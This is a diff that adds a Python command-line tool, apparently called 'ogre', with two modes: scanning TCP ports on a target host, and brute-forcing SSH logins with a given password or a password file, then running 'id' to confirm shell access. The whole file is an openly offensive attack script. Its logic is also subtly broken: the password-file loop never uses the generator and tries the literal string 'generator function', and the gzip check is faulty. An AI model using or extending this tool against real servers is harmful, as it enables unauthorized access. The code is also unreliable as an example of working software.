@@ -1,0 +1,185 @@
+#!/usr/bin/env python3
+
+import mimetypes
+import paramiko
+import socket
+import tempfile
+import gzip
+import sys
+
+VERSION = 0.01
+TEMP_DIR = tempfile.gettempdir()
+
+
+def send_packet(ip, port, timeout_seconds, recv_bytes):
+    """
+    [Errno 61] Connection refused => probably nothing listening
+
+    Listening will log something like:
+        SSH => "Did not receive identification string"
+        HTTP => 400
+
+    If this is a problem, open a pull req with better handling per protocol.
+    """
+    try:
+        socket.setdefaulttimeout(timeout_seconds)
+        _s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        #_s = socket.socket().connect((ip, port))
+        _s.connect((ip, port))
+        _s.sendall(b' ')  # send something to try to prompt a response
+        return 1, _s.recv(recv_bytes)
+    except Exception as e:
+        return 0, e
+
+
+def iterate_over_password_file(password_file):
+
+    if mimetypes.guess_type(password_file) == 'gzip':
+        # if file is gzip, use gzip.open
+        open = gzip.open
+
+    with open(password_file, 'rb') as pass_dict:
+        for line in pass_dict:
+            yield line
+
+
+def ssh(host, port, username, password=None, timeout=5):
+    """SSH to username@ip:port -p PASSWORD (optional)"""
+    KEYS_FILENAME = TEMP_DIR + '/ogre.keys'
+    LOG_FILENAME = TEMP_DIR + '/ogre.ssh.log'
+
+    try:
+        client = paramiko.SSHClient()
+        paramiko.util.log_to_file(LOG_FILENAME)
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+
+        try:
+            client.connect(hostname=host, port=port, username=username, password=password,
+                       timeout=timeout, banner_timeout=timeout, look_for_keys=False,
+                       key_filename=KEYS_FILENAME)
+            try:
+                stdin, stdout, stderr = client.exec_command('id')
+                for _s in [stdout, stderr]:
+                    #_s.readlines() for ChannelFile
+                    _s = list(_s)
+                    if len(_s) > 0:
+                        return 1, _s
+                client.close()
+            except socket.error as e:
+                return 0, "socket was closed on us"
+        except socket.error as e:
+            return 0, "[socket.error] {host} : {error}".format(host=host, error=e)
+        except paramiko.SSHException as pm_ssh:
+            return 0, "[paramiko.SSHException] : {0}".format(pm_ssh)
+        except Exception as e:
+            return 0, e
+
+    except:  # don't crash out, we might be in a loop to check N hosts
+        return 0, "{0} : fatal error".format(host)
+
+def scan(settings_dict):
+    if settings_dict['debug']:
+        print("DEBUG >> " + str(settings_dict))
+
+    for _port in settings_dict['ports']:
+        print(send_packet(settings_dict['host'], int(_port),
+                          settings_dict['timeout'], settings_dict['scan_receive_bytes']))
+
+
+def crack(settings_dict):
+
+    # TODO: DRY up -- potentially iterate on _password
+
+    if settings_dict['debug']:
+        print("DEBUG >> " + str(settings_dict))
+
+    if settings_dict['password']:
+        for _port in settings_dict['ports']:
+
+            print(ssh(host=settings_dict['host'], port=int(_port),
+                username=settings_dict['username'], password=settings_dict['password'],
+                timeout=settings_dict['timeout']))
+
+    else:
+        # Don't store all passwords in memory, password file may be large
+        password_generator = iterate_over_password_file(settings_dict['password_file'])
+
+        _password = 'generator function'
+
+        for _port in settings_dict['ports']:
+
+            print(ssh(host=settings_dict['host'], port=int(_port),
+                username=settings_dict['username'], password=_password, timeout=settings_dict['timeout']))
+
+
+
+if __name__ == '__main__':
+
+    import argparse
+
+    parser = argparse.ArgumentParser(description='Let\'s try to get a shell.\n')
+
+    actions = parser.add_argument_group('actions', 'at least one of the following actions is required:')
+    actions.add_argument('--scan', action='store_true', help='scan port for a tcp response.')
+    actions.add_argument('--crack', action='store_true', help='attempt to crack the SSH password on a server')
+
+    parser.add_argument('--version', action='version', version='%(prog)s {0}'.format(VERSION))
+    parser.add_argument('--verbose', '-v', action='store_true', default=False, help='vebose output')
+    parser.add_argument('--host', '--ip', dest='host', type=str, required=True, help='target host')
+    parser.add_argument('--port', '--ports', '-p', dest='ports', nargs='*',
+                        default='22', help='ports list (defaults to 22)') # don't enforce type (22-2222)
+    parser.add_argument('--scan_receive_bytes', '--scv', type=int, default='2048',
+                        help='number (int) of bytes to receive when opening raw sockets to hosts (defaults to 2048)')
+    parser.add_argument('--timeout', '-t',  metavar='TIMEOUT SECONDS',
+                        type=float, default=5.0, help='time you are willing to wait per host')
+    parser.add_argument('--log_file', '-l',  metavar='/PATH/TO/LOGFILE',
+                        type=str, default=TEMP_DIR+'/ogre.txt',
+                        help='path to logfile to use.  defaults to $TMPDIR/ogre.txt')
+    parser.add_argument('--debug', '-d', action='store_true', default=False, help='get debugging information')
+
+    # TODO: username file?
+    options_ssh = parser.add_argument_group('ssh', 'options for trying to get a shell via ssh')
+    options_ssh.add_argument('--username', '-u', type=str, help='specify username (defaults to root)')
+
+    #password_option = options_ssh.add_mutually_exclusive_group(required=True) -- this becomes a pain if scan only
+    options_ssh.add_argument('--password', '-pw',  metavar='PASSWORD',
+                             type=str, help='if you know the password, specify it, else, use --password_file')
+    options_ssh.add_argument('--password_file', '-f', metavar='PASSWORD_FILE_NAME',
+                             type=str, help='specify a password file, newline separated')
+    options_ssh.add_argument('--stop_on_success', action='store_true', default=True,
+                        help='stop trying to get a shell when successful')
+
+    args = parser.parse_args()
+
+    if len(sys.argv) < 2:
+        parser.print_help()
+
+    if args.ports:
+        if ('-' in args.ports[0]) and (',' in args.ports[0]):
+            raise NotImplementedError('comma separated and ranges not supported yet')
+        elif '-' in args.ports[0]:
+            args.ports = [int(s) for s in args.ports[0].split('-')]
+            args.ports[-1] += 1  # handle off by one-error
+            args.ports = range(args.ports[0], args.ports[-1])
+        elif ',' in args.ports[0]:
+            args.ports = args.ports[0].split(',')
+
+    # evaluate this only when we're done modifying args.
+    argument_dictionary = vars(args)
+
+    if args.scan and args.crack:
+        #return scan() success to crack()
+        raise NotImplementedError
+
+    elif args.scan:
+        scan(argument_dictionary)
+
+    elif args.crack:
+        if not (args.password or args.password_file):
+            parser.error('--crack specified, but neither --password or --password_file was set.')
+        if (args.password and args.password_file):
+            parser.error('please specify --password OR --password_file (not both).')
+        crack(argument_dictionary)
+
+    else:
+        parser.error('No action specified.  Re-run with scan or crack.')
